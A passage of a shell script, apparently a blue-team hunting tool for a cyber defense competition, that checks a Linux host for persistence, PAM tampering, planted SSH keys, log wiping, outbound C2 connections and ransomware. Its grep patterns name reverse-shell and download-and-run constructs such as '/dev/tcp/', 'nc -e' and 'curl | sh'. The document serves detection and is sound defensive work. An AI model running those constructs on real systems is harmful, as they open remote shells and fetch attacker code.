        if [ -z "$kf" ]; then why="$why, file not under /lib/modules"
        else from_package "$kf"; [ $? = 1 ] && why="$why, not from a package"; fi
        why=${why#, }
        [ -n "$why" ] && printf '    %s (%s)\n' "$m" "$why"
    done)
    if [ -n "$km" ]; then
        say "  kernel modules from outside the distribution (VirtualBox, ZFS or NVIDIA drivers show here too):"
        say "$km"
        say "  kernel taint now: $(cat /proc/sys/kernel/tainted 2>/dev/null) (0 = clean)"
    fi
    kb=$(find /proc/[0-9]*/fdinfo -maxdepth 1 -type f -exec grep -l '^prog_type:' {} + 2>/dev/null |
        cut -d/ -f3 | sort -u | while read -r p; do cat "/proc/$p/comm" 2>/dev/null; done | sort | uniq -c |
        awk '$2 !~ /^(systemd.*|\(sd-pam\)|dockerd|containerd.*|kubelet|k3s.*|cilium.*|calico.*|falco.*|tetragon|osqueryd|auditbeat|bpftrace|snapd|tracee.*)$/ {print "    " $2 " holds " $1 " eBPF program(s)"}')
    if [ -n "$kb" ]; then
        say "  programs holding eBPF programs (systemd and container tools do this; anything else, check):"
        say "$kb"
    fi
}

chk_pam() {
    sec pam "PAM lines that run a program or hand out passwords (T1556.003)"
    pout=$( { grep -r -n -E 'pam_exec|expose_authtok' /etc/pam.d 2>/dev/null
              grep -r -n -E '[[:space:]]/[^[:space:]]+\.so' /etc/pam.d 2>/dev/null |
                  grep -v -E '/(usr/)?lib(64)?/([^/]+/)?security/'
            } | grep -v -E ':[0-9]+:[[:space:]]*#' | sort -u)
    if [ -n "$pout" ]; then
        say "$pout" | sed 's/^/  /'
        say "  At the invitational: pam_exec ran a password stealer (unicode.so) from common-password."
        flag
        nxt "compare with your backup copy. Save evidence of the program it runs, then remove the line (with your lead)."
    else
        ok "none"
    fi
}

chk_pkg() {
    sec pkg "Program files that no longer match their package (T1554, T1556.003, T1574)"
    say "   Catches a swapped pam_deny.so, sshd, sudo, auditd or login. Config files you edited show as CONFIG."
    if [ "$(pkg_verify_kind)" = none ]; then
        say "  Cannot check here: $(os_name) keeps no file checksums for its packages."
        say "  By hand: compare important programs with a clean box of the same version: sha256sum /usr/sbin/sshd"
        return 0
    fi
    if have dpkg; then vo=$(verify_pkgs $SEC_PKGS); else vo=$(verify_pkgs $RPM_SEC_PKGS); fi
    if [ -n "$vo" ]; then
        say "$vo" | sed 's/^/  /'
        if printf '%s\n' "$vo" | grep -q -v '^CONFIG'; then
            flag
            nxt "a CHANGED program file is a swapped program. Save evidence, then reinstall its package, for example:"
            say "        $(reinstall_cmd "$(printf '%s\n' "$vo" | grep -v '^CONFIG' | head -1 | sed 's/^[A-Z]*: //')" 2>/dev/null)"
        fi
    else
        ok "every program file of PAM, SSH, sudo, login, auditd, systemd and cron matches its package"
    fi
    # Someone can edit the package database so a planted file looks like it belongs
    # to a package. The packages stayed the same but their file lists changed:
    if have dpkg && [ -f "$BASE" ] && [ -n "$NOW_SNAP" ] && [ -f "$NOW_SNAP" ]; then
        pb=$(grep '^PKGDB ' "$BASE"); pn=$(grep '^PKGDB ' "$NOW_SNAP")
        kb=$(grep '^PKG ' "$BASE" | cksum); kn=$(grep '^PKG ' "$NOW_SNAP" | cksum)
        if [ -n "$pb" ] && [ "$pb" != "$pn" ] && [ "$kb" = "$kn" ]; then
            say "  The package DATABASE was edited by hand: no package was installed or removed, but the"
            say "  file lists or checksums changed. That hides planted files from the checks above."
            flag
        fi
    fi
}

chk_preload() {
    sec preload "LD_PRELOAD, and libraries loaded into sshd (T1574.006)"
    lout=$( {
        [ -s /etc/ld.so.preload ] && sed 's|^|  /etc/ld.so.preload has: |' /etc/ld.so.preload
        grep -r -n 'LD_PRELOAD' /etc/systemd /run/systemd/system /etc/environment /etc/profile \
            /etc/profile.d /etc/bash.bashrc /root/.bashrc /root/.profile 2>/dev/null | sed 's/^/  /'
        for d in /proc/[0-9]*; do
            v=$(tr '\0' '\n' 2>/dev/null < "$d/environ" | grep '^LD_PRELOAD=') || continue
            printf '  pid %s (%s) runs with %s\n' "${d#/proc/}" "$(cat "$d/comm" 2>/dev/null)" "$v"
        done
        for sp in $(pgrep -x sshd 2>/dev/null); do
            awk '$6 ~ /\.so/ {print $6}' "/proc/$sp/maps" 2>/dev/null | sort -u | while read -r lib; do
                from_package "$lib"
                [ $? = 1 ] && printf '  sshd (pid %s) has a library loaded that no package installed: %s\n' "$sp" "$lib"
            done
        done
      } )
    if [ -n "$lout" ]; then
        say "$lout"
        say "  At the invitational: a drop-in (ssh.service.d/zz-udev-cache.conf) loaded a library into sshd."
        flag
        nxt "save evidence of the library, remove the line or drop-in, then systemctl daemon-reload and restart the service."
    else
        ok "none"
    fi
}

chk_sudo() {
    sec sudo "sudo rules beyond the usual admins, and every NOPASSWD rule (T1548.003)"
    dout=$(for f in /etc/sudoers /etc/sudoers.d/*; do
        [ -f "$f" ] || continue
        grep -v -E '^[[:space:]]*(#|$|Defaults|@include)' "$f" 2>/dev/null |
            awk '!/^[[:space:]]*(root|%sudo|%wheel|%admin)[[:space:]]/ || /NOPASSWD/' | sed "s|^|  $f: |"
    done)
    if [ -n "$dout" ]; then
        say "$dout"
        say "  At the invitational: /etc/sudoers.d/domain-users gave every domain user root."
        flag
        nxt "if your team did not add it: copy it to evidence, then remove it with visudo -f <file> (with your lead)."
    else
        ok "only the usual admin rules"
    fi
}

chk_accounts() {
    sec accounts "Accounts: root-level, no password, system accounts that can log in (T1136, T1098)"
    aout=$( {
        awk -F: '$3 == 0 && $1 != "root" {print "  root-level account (UID 0): " $1}' /etc/passwd
        [ -r /etc/shadow ] && awk -F: '$2 == "" {print "  NO password at all: " $1}' /etc/shadow
        awk -F: '{n[$3]++; u[$3] = u[$3] " " $1} END {for (i in n) if (n[i] > 1 && i != 0) print "  accounts sharing UID " i ":" u[i]}' /etc/passwd
        grep -n '^[+-]' /etc/passwd /etc/shadow /etc/group 2>/dev/null | sed 's/^/  old NIS "+" line: /'
        awk -F: '$3 > 0 && $3 < 1000 && $7 !~ /(nologin|false|sync|shutdown|halt)$/ && $7 != "" &&
                 $1 !~ /^(postgres|git|gitea|forgejo|gitlab-runner|jenkins)$/ {print "  system account with a login shell: " $1 " (" $7 ")"}' /etc/passwd
      } )
    if [ -n "$aout" ]; then
        say "$aout"
        flag
        nxt "ask your team. To lock an account you do not know: usermod -L <name> and usermod -s /usr/sbin/nologin <name>"
    else
        ok "only root has UID 0, every account has a password, no system account has a login shell"
    fi
    for g in sudo wheel admin docker lxd disk shadow; do
        gm=$(awk -F: -v g="$g" '$1 == g {print $4}' /etc/group 2>/dev/null)
        [ -n "$gm" ] || continue
        case "$g" in
            sudo|wheel|admin) gw='can become root with sudo' ;;
            docker|lxd) gw='same as root: can start a container that mounts the whole disk' ;;
            disk) gw='can read any file straight off the disk' ;;
            shadow) gw='can read the password hashes' ;;
        esac
        say "  $g group: $gm   ($gw)"
    done
}

chk_keys() {
    sec keys "SSH keys, and keys in unusual places (T1098.004)"
    kf=$( { awk -F: '{print $6}' /etc/passwd | sort -u | while read -r h; do
                for f in "$h"/.ssh/authorized_keys*; do [ -f "$f" ] && say "$f"; done
            done
            find /etc /opt /srv /usr/local /var/lib /var/www -xdev \
                \( -path /var/lib/docker -o -path /var/lib/containerd \) -prune -o \
                -name 'authorized_keys*' -type f -print 2>/dev/null
          } | sort -u)
    kodd=0
    if [ -n "$kf" ]; then
        printf '%s\n' "$kf" | while read -r f; do
            case "$f" in /root/*|/home/*) say "  $f" ;; *) say "  $f   <- outside a home folder" ;; esac
            awk '{for (i = 1; i <= NF; i++) if ($i ~ /^AAAA/) {c = ""; for (j = i + 1; j <= NF; j++) c = c " " $j
                  print "      key:" (c == "" ? " (no comment)" : c); break}}' "$f" 2>/dev/null
        done
        printf '%s\n' "$kf" | grep -q -v -E '^/(root|home)/' && kodd=1
        say "  At the invitational: a root@localhost key was planted in /etc/ssh/.ssh/authorized_keys."
    else
        say "  no SSH key files"
    fi
    sb=$(find_sshd) && "$sb" -T 2>/dev/null | grep -i -E '^(authorizedkeysfile|authorizedkeyscommand) ' | sed 's/^/  sshd setting: /'
    if [ "$kodd" = 1 ]; then
        flag
        nxt "a key file outside a home folder only works if sshd points there. Save it as evidence, then empty it."
    fi
    say "  Every key above: does your team know it? A planted key survives every password change."
}

chk_sshd() {
    sec sshd "SSH server settings that open a back door (T1098.004, T1556)"
    sb=$(find_sshd) || { ok "no sshd on this box"; return 0; }
    sv=$("$sb" -T 2>/dev/null)
    rk=$(printf '%s\n' "$sv" | awk '
        $1 == "permitemptypasswords" && $2 == "yes" {print "  PermitEmptyPasswords yes: accounts with no password can log in"}
        $1 == "permituserenvironment" && $2 != "no" {print "  PermitUserEnvironment " $2 ": a user file can set LD_PRELOAD for their session"}
        $1 == "hostbasedauthentication" && $2 == "yes" {print "  HostbasedAuthentication yes: trusts other machines instead of passwords"}
        $1 == "ignorerhosts" && $2 == "no" {print "  IgnoreRhosts no: .rhosts files are trusted"}
        $1 == "trustedusercakeys" && $2 != "none" {print "  TrustedUserCAKeys " $2 ": any certificate signed by that key logs in"}
        $1 == "authorizedkeyscommand" && $2 != "none" {print "  AuthorizedKeysCommand " $2 ": a program decides which keys work"}
        $1 == "authorizedprincipalsfile" && $2 != "none" {print "  AuthorizedPrincipalsFile " $2}
        $1 == "gatewayports" && $2 != "no" {print "  GatewayPorts " $2 ": SSH tunnels can open ports for other machines"}
        $1 == "permittunnel" && $2 != "no" {print "  PermitTunnel " $2 ": SSH can carry a whole network tunnel"}
        $1 == "forcecommand" && $2 != "none" {print "  ForceCommand " $2}')
    for f in /etc/ssh/sshrc /root/.ssh/rc /home/*/.ssh/rc /root/.ssh/environment /home/*/.ssh/environment /root/.rhosts /home/*/.rhosts /etc/hosts.equiv; do
        [ -f "$f" ] && rk="$rk
  $f exists: it runs, sets variables or grants trust at every SSH login"
    done
    say "  now: $(printf '%s\n' "$sv" | awk '$1 == "permitrootlogin" {r = $2} $1 == "passwordauthentication" {p = $2} END {print "root login " r ", password login " p}')"
    if [ -n "$rk" ]; then
        say "$rk" | sed '/^$/d'
        flag
        nxt "if your team did not set it, fix it in /etc/ssh/sshd_config (or the file in sshd_config.d), test with sshd -t, then reload."
    else
        ok "none of the risky settings are on"
    fi
}

auth_log() {   # the recent SSH and login log, from a file or from the journal
    for al in /var/log/auth.log /var/log/secure; do
        [ -f "$al" ] && [ -r "$al" ] && { tail -n 20000 "$al"; return 0; }
    done
    if ! have journalctl || ! journalctl -n 1 -q --no-pager >/dev/null 2>&1; then
        for al in /var/log/messages /var/log/syslog; do
            [ -f "$al" ] && [ -r "$al" ] && grep -q -E 'sshd|dropbear' "$al" 2>/dev/null && { tail -n 20000 "$al" | grep -E 'sshd|dropbear|login|su[:[]'; return 0; }
        done
        have logread && { logread 2>/dev/null | grep -E 'sshd|dropbear|login|su[:[]'; return 0; }
    fi
    have journalctl && journalctl -u ssh -u sshd --since -6h --no-pager 2>/dev/null
}

outside_nets() {   # is $1 outside OURNETS? (no OURNETS set: never)
    [ -n "$OURNETS" ] || return 1
    case "$1" in *:*|'') return 1 ;; esac
    for on in $OURNETS; do in_net "$1" "$on" && return 1; done
    return 0
}

chk_logins() {
    sec logins "Who is logged in now, and who logged in recently (T1078 Valid Accounts, T1110)"
    lbad=0
    if have who; then
        w=$(who 2>/dev/null)
        if [ -n "$w" ]; then
            say "  logged in right now:"
            printf '%s\n' "$w" | while read -r wl; do
                wip=$(printf '%s\n' "$wl" | sed -n 's/.*(\([0-9.]*\)).*/\1/p')
                m=''
                [ -n "$wip" ] && outside_nets "$wip" && m='   <- from outside your networks'
                say "    $wl$m"
            done
            for wip in $(printf '%s\n' "$w" | sed -n 's/.*(\([0-9.]*\)).*/\1/p'); do outside_nets "$wip" && lbad=1; done
        fi
    fi
    src=$(auth_log)
    acc=$(printf '%s\n' "$src" | grep -E 'sshd.*Accepted (password|publickey|keyboard-interactive|gssapi)')
    if [ -n "$acc" ]; then
        say "  SSH logins that worked (account, from, how; count, newest last):"
        printf '%s\n' "$acc" | sed -n 's/.*Accepted \([^ ]*\) for \([^ ]*\) from \([^ ]*\) .*/\2 \3 \1/p' |
            awk '{k = $1 " " $2 " " $3; if (!(k in n)) o[++c] = k; n[k]++} END {for (i = 1; i <= c; i++) {split(o[i], a, " "); printf "    %-16s from %-16s %-10s x%d\n", a[1], a[2], a[3], n[o[i]]}}' | tail -12
        for aip in $(printf '%s\n' "$acc" | sed -n 's/.* from \([0-9.]*\) .*/\1/p' | sort -u); do
            outside_nets "$aip" && { say "    $aip is outside your networks"; lbad=1; }
        done
    fi
    fails=$(printf '%s\n' "$src" | grep -E 'Failed password|Invalid user')
    if [ -n "$fails" ]; then
        say "  failed SSH logins, top sources (count, address):"
        printf '%s\n' "$fails" | grep -o -E 'from [0-9a-fA-F.:]+' | awk '{print $2}' |
            sort | uniq -c | sort -rn | head -5 | sed 's/^/   /'
        say "  top account names tried:"
        printf '%s\n' "$fails" | sed -n -E 's/.*(Failed password for (invalid user )?|Invalid user )([^ ]+) from.*/\3/p' |
            sort | uniq -c | sort -rn | head -5 | sed 's/^/   /'
        ftop=$(printf '%s\n' "$fails" | grep -o -E 'from [0-9a-fA-F.:]+' | awk '{print $2}' | sort | uniq -c | sort -rn | awk 'NR == 1 {print $1}')
        [ "${ftop:-0}" -ge 20 ] && lbad=1
    fi
    [ -z "$acc$fails" ] && say "  no SSH logins in the recent log"
    if [ "$lbad" = 1 ]; then
        flag
        nxt "a login you cannot explain: find the session (who -u), save the time and address, then sh first30.sh block <address>."
        say "        Password guessing from one address: block it too. Never block the scoring engine (check the packet)."
    fi
    [ -z "$OURNETS" ] && say "  Tip: tell the script your networks so outside addresses get marked: sh first30.sh nets 10.100.130.0/24"
}

chk_jobs() {
    sec jobs "Scheduled jobs and auto-starts that download, decode or call out (T1053, T1105, T1059.004)"
    jout=$(grep -r -n -I -E 'curl |wget |base64 +(-d|--decode)|python[0-9.]* +-c|perl +-e|/dev/tcp/|/dev/udp/|nc +-e|ncat +-e|socat |mkfifo|openssl +s_client|bash +-i|sh +-i|chmod +\+x +/(tmp|dev/shm|var/tmp)|\| *(ba)?sh( |$)' \
        /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /var/spool/cron /etc/systemd/system \
        /usr/local/lib/systemd/system /etc/rc.local /etc/profile.d /etc/init.d /etc/inetd.conf /etc/xinetd.d \
        /var/spool/cron/atjobs /var/spool/at /etc/systemd/user /root/.config/systemd/user \
        /etc/crontabs /etc/periodic /etc/local.d /var/spool/cron/tabs 2>/dev/null |
        grep -v -E ':[0-9]+:[[:space:]]*#' | head -30)
    jx=''
    if have atq; then
        aq=$(atq 2>/dev/null)
        [ -n "$aq" ] && jx="$jx
  at jobs waiting to run (atq; read one with at -c <number>):
$(say "$aq" | sed 's/^/    /')"
    fi
    for d in /root/.config/systemd/user /home/*/.config/systemd/user; do
        [ -d "$d" ] && jx="$jx
  user services in $d: $(ls "$d" 2>/dev/null | tr '\n' ' ')"
    done
    [ -n "$(ls /var/lib/systemd/linger 2>/dev/null)" ] && jx="$jx
  accounts whose own services start at boot (linger): $(ls /var/lib/systemd/linger | tr '\n' ' ')"
    iw=$( { grep -v -E '^[[:space:]]*(#|$)' /etc/inetd.conf 2>/dev/null
            grep -l -i -E 'disable[[:space:]]*=[[:space:]]*no' /etc/xinetd.d/* 2>/dev/null | sed 's/^/xinetd service on: /'
            grep -H -n -i -E '(spawn|twist)' /etc/hosts.allow /etc/hosts.deny 2>/dev/null | grep -v -E ':[0-9]+:[[:space:]]*#'
          } )
    [ -n "$iw" ] && jx="$jx
  inetd services, and hosts.allow/deny lines that run a command (old-school backdoors):
$(say "$iw" | sed 's/^/    /')"
    if [ -n "$jout$jx" ]; then
        [ -n "$jout" ] && say "$jout" | sed 's/^/  /'
        [ -n "$jx" ] && say "$jx" | sed '/^$/d'
        say "  At the invitational: dropper scripts (/tmp/coord_*.sh) pulled the imix agent over HTTP."
        flag
        nxt "read the whole job. If it is not your team's: copy it to evidence, then remove it (crontab -e, atrm, or delete the file)."
    else
        ok "no scheduled job downloads, decodes or opens a connection"
    fi
}

chk_shellinit() {
    sec shellinit "Shell startup files that hijack commands or hide history (T1546.004, T1070.003)"
    sf=''
    for f in /etc/profile /etc/profile.d/*.sh /etc/bash.bashrc /etc/bashrc /etc/zsh/zshrc /etc/zshrc /etc/environment \
        /root/.bashrc /root/.profile /root/.bash_profile /root/.bash_login /root/.bash_logout /root/.zshrc \
        /home/*/.bashrc /home/*/.profile /home/*/.bash_profile /home/*/.bash_login /home/*/.bash_logout /home/*/.zshrc; do
        [ -f "$f" ] && sf="$sf
$f"
    done
    iout=$(printf '%s\n' "$sf" | sed '/^$/d' | tr '\n' '\0' | xargs -0 grep -H -n -E \
        'alias[[:space:]]+(sudo|su|ssh|passwd|ps|ss|netstat|who|w|last|kill|lsof|top|crontab|systemctl|iptables|history)=|^[[:space:]]*(function[[:space:]]+)?(sudo|su|ssh|passwd|ps|ss|netstat|crontab|systemctl|iptables)[[:space:]]*\(\)|trap[[:space:]].*(DEBUG|RETURN)|LD_PRELOAD|HISTFILE=/dev/null|unset[[:space:]]+HISTFILE|HISTSIZE=0|HISTFILESIZE=0|set[[:space:]]+\+o[[:space:]]+history|PROMPT_COMMAND=.*(history|>>|curl|wget|nc |/dev/tcp|logger)|/dev/tcp/|nc[[:space:]]+-e|(curl|wget)[[:space:]].*\|[[:space:]]*(ba)?sh|base64[[:space:]]+(-d|--decode)' \
        2>/dev/null | grep -v -E ':[0-9]+:[[:space:]]*#')
    for h in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do
        [ -L "$h" ] && iout="$iout
$h -> $(readlink "$h")  (command history is being thrown away)"
    done
    iout=$(printf '%s\n' "$iout" | sed '/^$/d')
    if [ -n "$iout" ]; then
        say "$iout" | sed 's/^/  /'
        flag
        nxt "an alias or function named sudo or su can steal passwords. Remove the line; check in a NEW shell with: type sudo"
    else
        ok "no command hijacks and no history tricks in the shell startup files"
    fi
}

chk_tamper() {
    sec tamper "Locked files and hidden file content (chattr +i, T1222.002; content filters, T1014)"
    tl=$(locked_files)
    th=''
    for f in /etc/ld.so.preload /etc/passwd /etc/shadow /etc/group /etc/sudoers /etc/crontab /etc/ssh/sshd_config \
        /etc/pam.d/common-auth /etc/pam.d/common-password /etc/pam.d/system-auth /etc/pam.d/sshd /root/.ssh/authorized_keys /etc/modules /etc/hosts; do
        [ -f "$f" ] || continue
        s1=$(stat -c %s "$f" 2>/dev/null) || continue
        s2=$(wc -c < "$f" 2>/dev/null | tr -d ' ')
        [ "$s1" != "$s2" ] && th="$th
    $f: the disk says $s1 bytes, reading it gives $s2 (something filters what you see)"
    done
    # permissions (CIS 6.1, 6.2.6): password hashes readable by everyone, key files anyone can
    # edit, and folders in root's PATH that anyone can write to (a fake ls or sudo planted there)
    for f in /etc/shadow /etc/gshadow /etc/shadow- /etc/gshadow-; do
        [ -f "$f" ] || continue
        case "$(stat -c %a "$f" 2>/dev/null)" in *[1-7]) th="$th
    $f can be read by every account (the password hashes): chmod 640 $f" ;; esac
    done
    tw=$( { find /etc/passwd /etc/group /etc/shadow /etc/sudoers /etc/sudoers.d /etc/crontab /etc/cron.d /etc/ssh \
                /etc/pam.d /etc/ld.so.preload /etc/profile /etc/profile.d /etc/systemd/system /root/.ssh -xdev -perm -0002 \
                ! -type l 2>/dev/null
            find /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /root -maxdepth 0 -perm -0002 ! -type l 2>/dev/null
          } | sort -u)
    [ -n "$tw" ] && th="$th
    anyone can change these (world-writable): $(printf '%s ' $tw)"
    if [ -n "$tl$th" ]; then
        if [ -n "$tl" ]; then
            say "  locked files (i = nobody can change or delete it, a = can only grow):"
            say "$tl" | sed 's/^/    /'
        fi
        [ -n "$th" ] && say "  files with hidden content or unsafe permissions:$th"
        flag
        nxt "fix permissions with the chmod shown. Unlock a locked file with chattr -i <file> (or -a) before you change it."
    else
        ok "no locked files, file sizes match what reading them gives, and permissions are safe"
    fi
}

chk_logs() {
    sec logs "Logs: cleared, cut short, or switched off (T1070.002, T1562.006)"
    lst="$VAULT/.logstate_$HOST"
    lnew="$lst.new.$$"
    lout=''
    : > "$lnew"
    for f in /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages /var/log/kern.log \
        /var/log/audit/audit.log /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/cron \
        /var/log/nginx/access.log /var/log/apache2/access.log /var/log/httpd/access_log; do
        if [ -L "$f" ]; then
            case "$(readlink "$f")" in /dev/null) lout="$lout
    $f points to /dev/null: nothing gets saved" ;; esac
            continue
        fi
        [ -f "$f" ] || continue
        # shellcheck disable=SC2046
        set -- $(stat -c '%i %s' "$f" 2>/dev/null)
        [ "$#" = 2 ] || continue
        printf '%s %s %s\n' "$f" "$1" "$2" >> "$lnew"
        old=$(awk -v f="$f" '$1 == f {print $2, $3}' "$lst" 2>/dev/null)
        [ -n "$old" ] || continue
        oi=${old% *} os=${old#* }
        if [ "$oi" = "$1" ] && [ "$2" -lt "$os" ]; then
            lout="$lout
    $f got SMALLER since the last hunt ($os -> $2 bytes, same file): it was cut"
        fi
    done
    if [ ! -s "$lnew" ] && { ! have journalctl || ! journalctl -n 1 -q --no-pager >/dev/null 2>&1; }; then
        if have logread; then lout="$lout
    no log files on disk: this box keeps its log only in memory (logread), and a reboot erases it"
        else lout="$lout
    no log files and no journal: nothing is being logged on this box"; fi
    fi
    mv "$lnew" "$lst" 2>/dev/null
    if [ ! -e /var/log/auth.log ] && [ ! -e /var/log/secure ] && have rsyslogd; then
        lout="$lout
    the login log (auth.log or secure) is missing"
    fi
    for f in /etc/rsyslog.conf /etc/rsyslog.d/*.conf; do
        [ -f "$f" ] || continue
        r=$(grep -n -E '^[[:space:]]*[^#&[:space:]].*[[:space:]](stop|~)[[:space:]]*$' "$f" 2>/dev/null)
        [ -n "$r" ] && lout="$lout
    $f throws log lines away: $r"
        r=$(grep -n -E '^[^#]*(@@?[0-9A-Za-z[]|omfwd)' "$f" 2>/dev/null)
        [ -n "$r" ] && say "  $f sends logs to another machine (fine if it is your team's log server): $r"
    done
    for f in /etc/systemd/journald.conf /etc/systemd/journald.conf.d/*.conf; do
        [ -f "$f" ] && grep -q -E '^[[:space:]]*Storage=(none|volatile)' "$f" && lout="$lout
    $f sets the journal to $(grep -E '^[[:space:]]*Storage=' "$f" | tail -1): logs are lost (or gone at reboot)"
    done
    if have systemctl && have rsyslogd; then
        systemctl is-active rsyslog >/dev/null 2>&1 || systemctl is-active syslog >/dev/null 2>&1 || lout="$lout
    rsyslog is installed but NOT running: nothing new goes into /var/log"
    fi
    if [ -n "$lout" ]; then
        say "$lout" | sed '/^$/d'
        flag
        nxt "write down the time (it tells you when red team was here). Turn logging back on. auditd keeps its own log."
    else
        ok "logs are there, still growing, and none is thrown away"
    fi
}

# ---------------------------------------------------------------- C2 (shared by hunt and c2)
# At the invitational, a dropper put the imix agent in /tmp/.sysupd.bin, and it
# called 10.197.114.55:8001 over HTTP.
in_net() {   # is the IPv4 address $1 inside $2 (an address, or address/bits)?
    awk -v ip="$1" -v net="$2" 'BEGIN {
        if (split(net, n, "/") < 2) n[2] = 32
        if (split(ip, a, ".") != 4 || split(n[1], b, ".") != 4) exit 1
        m = 2 ^ (32 - n[2])
        x = ((a[1] * 256 + a[2]) * 256 + a[3]) * 256 + a[4]
        y = ((b[1] * 256 + b[2]) * 256 + b[3]) * 256 + b[4]
        exit !(int(x / m) == int(y / m))
    }'
}

blocked_list() { [ -f "$VAULT/blocked.txt" ] && awk '{print $1}' "$VAULT/blocked.txt" | sort -u; }

listen_ports() {
    if have ss; then ss -tln 2>/dev/null | sed 1d | awk '{print $4}'
    else netstat -tln 2>/dev/null | awk '$1 ~ /^tcp/ {print $4}'; fi | sed 's/.*://' | sort -u | tr '\n' ' '
}

conns() {   # open or opening TCP connections: STATE PEER_IP PEER_PORT LOCAL_PORT PID PROGRAM
    if have ss; then
        ss -tnp 2>/dev/null | awk 'NR > 1 && ($1 == "ESTAB" || $1 == "SYN-SENT") {print $1, $4, $5, $NF}'
    elif have netstat; then
        netstat -tnp 2>/dev/null | awk '$1 ~ /^tcp/ && ($6 == "ESTABLISHED" || $6 == "SYN_SENT") {print $6, $4, $5, $7}'
    fi | while read -r st local peer owner; do
        pport=${peer##*:}
        pip=${peer%:*}; pip=${pip#\[}; pip=${pip%\]}; pip=${pip#::ffff:}
        pid=$(printf '%s\n' "$owner" | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p')
        prog=$(printf '%s\n' "$owner" | sed -n 's/.*(("\([^"]*\)".*/\1/p')
        if [ -z "$pid" ]; then
            case "$owner" in [0-9]*/*) pid=${owner%%/*}; prog=${owner#*/} ;; esac
        fi
        printf '%s %s %s %s %s %s\n' "$st" "$pip" "$pport" "${local##*:}" "${pid:--}" "${prog:--}"
    done
}

outbound() {   # connections this box opened to somewhere else: PEER PORT PROGRAM PID LOCAL_PORT STATE
    conns | while read -r st ip port lport pid prog; do
        case " $LPORTS " in *" $lport "*) continue ;; esac   # an answer from one of our own services
        case "$ip" in 127.*|::1|'') continue ;; esac
        printf '%s %s %s %s %s %s\n' "$ip" "$port" "$prog" "$pid" "$lport" "$st"
    done
}

c2_rows() {
    bl=$(blocked_list | tr '\n' ' ')
    outbound | awk '{print $1, $2, $3, $4, $6}' | sort | uniq -c | while read -r cnt ip port prog pid st; do
        why=''
        for b in $bl; do in_net "$ip" "$b" && why="$why blocked-address"; done
        outside_nets "$ip" && why="$why outside-our-networks"
        case "$st" in SYN*) why="$why still-trying-to-connect" ;; esac
        exe=''
        acct='?'
        if [ "$pid" != - ]; then
            exe=$(readlink "/proc/$pid/exe" 2>/dev/null)
            acct=$(ps -o user= -p "$pid" 2>/dev/null | tr -d ' ')
            case "$exe" in
                *' (deleted)') why="$why program-deleted" ;;
                /tmp/*|/var/tmp/*|/dev/shm/*|*/.*) why="$why hidden-or-temp-path" ;;
            esac
            if [ -n "$exe" ]; then
                from_package "${exe% (deleted)}"
                [ $? = 1 ] && why="$why not-from-a-package"
            fi
        fi
        to="$ip:$port"
        [ "$cnt" -gt 1 ] && to="$to (x$cnt)"
        printf '  %-16s %-7s %-10s %-22s %s\n' "$prog" "$pid" "$acct" "$to" "${why:- -}"
        [ -n "$exe" ] && printf '  %-16s   program: %s\n' '' "$exe"
    done
}

chk_c2() {
    sec c2 "Connections out of this box right now (T1071; for a 30-second watch: sh first30.sh c2)"
    LPORTS=$(listen_ports)
    co=$(c2_rows)
    if [ -z "$co" ]; then ok "no connections out of this box right now"; return 0; fi
    printf '  %-16s %-7s %-10s %-22s %s\n' PROGRAM PID ACCOUNT 'TO ADDRESS:PORT' 'MARKED BECAUSE'
    say "$co"
    if printf '%s\n' "$co" | grep -q -E 'outside-our-networks|blocked-address|program-deleted|hidden-or-temp-path|not-from-a-package'; then
        flag
        nxt "write down the program, address and time. Save the program (evidence), then: sh first30.sh block <address>"
    fi
}

chk_ci() {
    sec ci "CI/CD runners and containers (the organizers said to expect more CI)"
    chit=0
    for rp in $(pgrep -f -i 'forgejo-runner|act_runner|gitea-runner|gitlab-runner|Runner\.Listener|woodpecker-agent|drone-runner' 2>/dev/null); do
        rcmd=$(tr '\0' ' ' 2>/dev/null < "/proc/$rp/cmdline")
        [ -n "$rcmd" ] || continue
        say "  runner: pid $rp as $(ps -o user= -p "$rp" 2>/dev/null | tr -d ' '): $rcmd"
        if printf '%s' "$rcmd" | grep -q ':host' || grep -q -s ':host' "/proc/$rp/cwd/.runner"; then
            say "    Jobs run directly on THIS box (a 'host' label). Anyone who can push a workflow to the repo"
            say "    can run commands here. Use a docker label, and limit who can push."
            chit=1
        fi
    done
    if have docker && tmo docker ps -q >/dev/null 2>&1; then
        for cid in $(tmo docker ps -q 2>/dev/null); do
            cinfo=$(tmo docker inspect -f '{{.Name}} privileged={{.HostConfig.Privileged}} net={{.HostConfig.NetworkMode}} pid={{.HostConfig.PidMode}}{{range .Mounts}} mount={{.Source}}{{end}}' "$cid" 2>/dev/null)
            case "$cinfo" in
                *privileged=true*|*net=host*|*pid=host*|*mount=/var/run/docker.sock*|*mount=/run/docker.sock*|*'mount=/ '*|*'mount=/')
                    say "  container with host-level access: $cinfo"
                    chit=1 ;;
            esac
        done
    fi
    if [ "$chit" = 1 ]; then flag; else ok "no CI runner with a host label, and no container with host-level access"; fi
}

chk_ransom() {
    sec ransom "Ransomware signs: locked files and ransom notes (T1486)"
    ro=$(find /home /root /srv /var/www /opt -xdev -maxdepth 4 -type f \( -name '*.locked' -o -name '*.encrypted' \
        -o -iname '*ransom*' -o -iname '*decrypt*' -o -iname '*how_to_recover*' \) 2>/dev/null |
        grep -v "^$VAULT/" | head -10)
    if [ -n "$ro" ]; then
        say "$ro" | sed 's/^/  /'
        flag
        nxt "tell your lead NOW and restore from your backup (sh first30.sh backup made a copy in $VAULT)."
    else
        ok "none"
    fi
}

chk_bait() {
    [ -n "$BAIT" ] || return 0
    sec bait "Your bait file and bait login (T1552.001: someone went looking for passwords)"
    say "  bait file: $BAIT   bait login name: $BAITUSER"
    bo=''
    [ -e "$BAIT" ] || bo="$bo
    the bait file is GONE: someone deleted or moved it"
    if have ausearch; then
        br=$(ausearch -k bait --format text 2>/dev/null | grep -v -E '(add|remove)_rule' | tail -5)
        [ -z "$br" ] && br=$(ausearch -k bait -i 2>/dev/null | grep -E 'type=SYSCALL' | tail -5)
        [ -n "$br" ] && bo="$bo
    someone opened the bait file (newest last):
$(say "$br" | sed 's/^/      /')"
    fi
    if [ -n "$BAITUSER" ]; then
        bu=$(auth_log | grep -F -w -- "$BAITUSER" | tail -5)
